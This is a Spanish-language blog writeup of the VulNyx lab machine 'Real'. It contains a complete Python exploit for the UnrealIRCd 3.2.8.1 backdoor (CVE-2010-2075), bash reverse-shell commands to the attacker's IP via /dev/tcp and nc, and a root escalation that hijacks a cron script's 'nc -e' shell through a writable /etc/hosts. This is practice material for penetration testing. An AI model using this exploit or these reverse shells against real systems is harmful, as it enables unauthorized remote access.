---
date: 2023-06-02 12:00:00
layout: post
title: Real Writeup
subtitle: Writeup de la máquina Real de la plataforma VulNyx
description: Realizaré la máquina Real explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Easy.
image: https://raw.githubusercontent.com/VulNyx/vulnyx.github.io/main/assets/logo-og.png
optimized_image: https://raw.githubusercontent.com/VulNyx/vulnyx.github.io/main/assets/logo-og.png
category: Writeup
tags:
  - VulNyx
  - Writeup
  - Linux
author: FredBrave
---
# Enumeración
Encontramos la ip de la máquina objetivo dentro de nuestro segmento de red.
```bash
$ sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:ec:3f:6c, IPv4: 10.0.2.48
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1	52:54:00:12:35:00	QEMU
10.0.2.3	08:00:27:30:6e:10	PCS Systemtechnik GmbH
10.0.2.2	52:54:00:12:35:00	QEMU
10.0.2.119	08:00:27:2f:57:1f	PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.998 seconds (128.13 hosts/sec). 4 responded
```
Una vez encontrada la ip realizamos un escaneo rápido para encontrar los puertos abiertos en la máquina. Y otro más exhaustivo sobre los puertos abiertos para encontrar los servicios y versiones corriendo en los puertos.
```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.0.2.119 -oG Targeted   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 13:02 EDT
Nmap scan report for 10.0.2.119
Host is up (0.000086s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
6697/tcp open  ircs-u
8067/tcp open  infi-async
MAC Address: 08:00:27:2F:57:1F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.82 seconds

$ sudo nmap -p22,80,6667,6697,8067 -sCV 10.0.2.119 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 13:02 EDT
Nmap scan report for 10.0.2.119
Host is up (0.00044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 db282bab632a0ed5ea188d2f6d8c452d (RSA)
|   256 cda1c32e20f0f3f6d39b278e9a2d2611 (ECDSA)
|_  256 db9869a58bbd0586163d9c8b307ba36c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:2F:57:1F (Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```
De entre los puertos que encontramos abiertos el 22,80 y 6667 son los más interesantes.
# Shell como server
No encontré nada interesante al enumerar el puerto 80 y 22. Así que trate de encontrar algo en el UnrealIRCD(6667).
```bash
searchsploit UnrealIRCd
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                                                | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                                                     | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                                                                              | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                                                                                                                   | windows/dos/27407.pl
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Encontré un posible exploit que podría funcionar para el UnrealIRCD, pero estaba en Metasploit por lo que decidí buscar uno igual en GitHub encontré algunos y no me funcionaban, pero leyéndolos entendí el exploit y trate de realizar uno por mi propia cuenta.
```python3
# CVE: 2010-2075
# Backdoor in UnrealIRCd 3.2.8.1
# Exploit Author: FredBrave

import socket, optparse, sys, signal

#Global Variables
BACKDOOR_PREFIX = 'AB;'



#Functions
def Exiting(sig, frame):
    print("\nExiting the exploit...")
    sys.exit(1)

#CTLR + C
signal.signal(signal.SIGINT,Exiting)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='Target', help='Target IP')
    parser.add_option('-p', '--port', dest='port', help='Open Port with IRCD', type=int)
    parser.add_option('-c', '--cmd', dest='cmd', help='Comman to execute')
    (options, arguments) = parser.parse_args()
    if not options.Target:
        parser.error("[-] Please indicate the Target IP -t, for more information... --help")
    if not options.port:
        parser.error("[-] Please indicate the port -p, for more information... --help")
    if not options.cmd:
        parser.error("[-] Please indicate the command to execute -c. Example: --cmd 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1', for more information... --help")
    return options

def RCExplotation(Target,port,cmd):
    print('Creating connection')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Creating payload')
    payload = '{} {}'.format(BACKDOOR_PREFIX, cmd)
    s.connect((Target,port))
    rce = s.recv(1024).decode()
    print('[*]Sending Payload...')
    s.send(payload.encode())
    rce = s.recv(1024).decode()

def main():
    options = get_arguments()
    RCExplotation(options.Target, options.port, options.cmd)

if __name__ == '__main__':
    main()
```
El exploit del CVE:2010-2075 estará subido en mi <a href='https://github.com/FredBrave/CVE-2010-2075-UnrealIRCd-3.2.8.1'>GitHub</a>. Al probar el exploit me funciono por lo que pude obtener una consola.
```bash
$ python3 CVE-2010-2075.py -t 10.0.2.119 -p 6667 -c 'bash -c "bash -i >& /dev/tcp/10.0.2.48/443 0>&1"'
Creating connection
Creating payload
[*]Sending Payload...

$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.0.2.48] from (UNKNOWN) [10.0.2.119] 49250
bash: cannot set terminal process group (360): Inappropriate ioctl for device
bash: no job control in this shell
server@real:~/irc/Unreal3.2$ whoami
server
server@real:~/irc/Unreal3.2$
```
# Shell como root
Empiezo un tratamiento de la tty.
```bash
server@real:~/irc/Unreal3.2$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
server@real:~/irc/Unreal3.2$ ^Z
[1]  + 3608 suspended  nc -nlvp 443
CTRL + Z
$ stty raw -echo;fg
[1]  + 3608 continued  nc -nlvp 443

server@real:~/irc/Unreal3.2$ export TERM=xterm
server@real:~/irc/Unreal3.2$ export SHELL=bash
server@real:~/irc/Unreal3.2$ stty rows 48 columns 238
server@real:~/irc/Unreal3.2$
```
Encuentro que el siguiente archivo se ejecuta cada tanto tiempo por root.
```bash
server@real:/opt$ ls -la /opt/task
-rwx---r-- 1 root root 277 May  3 08:39 /opt/task
server@real:/opt$ cat /opt/task
#!/bin/bash

domain='shelly.real.nyx'

function check(){

        timeout 1 bash -c "/usr/bin/ping -c 1 $domain" > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
        exit 0
    else
        exit 1
    fi
}

check
```
Analizándolo podemos discernir que el script está mandando una shell al puerto 65000 al dominio shelly.real.nyx. Sabiendo esto prosigo a averiguar los permisos del archivo /etc/hosts.
```bash
server@real:/opt$ ls -la /etc/hosts
-rw----rw- 1 root root 214 May 31 12:32 /etc/hosts
```
Puedo escribir en este, por lo que trataremos de hacer que el dominio shelly.real.nyx apunte a nuestra máquina para que así nosotros solo estemos en escucha en el puerto 65000 hasta que nos llegue una shell.
```bash
server@real:/opt$ cat /etc/hosts
127.0.0.1	localhost
1.2.3.4		real
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
server@real:/opt$ nano /etc/hosts
server@real:/opt$ cat /etc/hosts
127.0.0.1	localhost
1.2.3.4		real
10.0.2.48  shelly.real.nyx
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Ahora en escucha en nuestra máquina en el puerto 65000 esperamos y deberíamos obtener un shell.
```bash
$ nc -nlvp 65000
listening on [any] 65000 ...
connect to [10.0.2.48] from (UNKNOWN) [10.0.2.119] 39892
whoami
root
```
Hemos pwneado la maquina!!!

